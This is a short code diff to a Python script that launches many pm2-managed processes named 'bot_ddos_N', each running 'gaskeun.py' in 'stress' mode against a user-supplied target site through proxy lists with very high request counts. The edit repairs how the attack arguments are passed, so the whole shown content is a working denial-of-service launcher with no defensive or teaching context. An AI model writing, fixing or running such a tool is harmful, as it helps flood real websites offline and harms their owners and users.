@@ -10,7 +10,7 @@ def gas():
     proxy_types = input('Proxy_Type  : ')
     jumlah_bot = int(input('Jumlah Bot  : '))
     for _ in range(jumlah_bot):
-        os.system(f'pm2 start gaskeun.py --name=bot_ddos_{_} --interpreter=python3 --restart-delay 30 STRESS {target_site} {proxy_types} 100000 proxy_bot_{_}.txt 100 100000')
+        os.system(f'pm2 start gaskeun.py --name=bot_ddos_{_} --interpreter=python3 --restart-delay 30 -- stress {target_site} {proxy_types} 100000 proxy_bot_{_}.txt 100 100000')
     print('DONE')
 
 
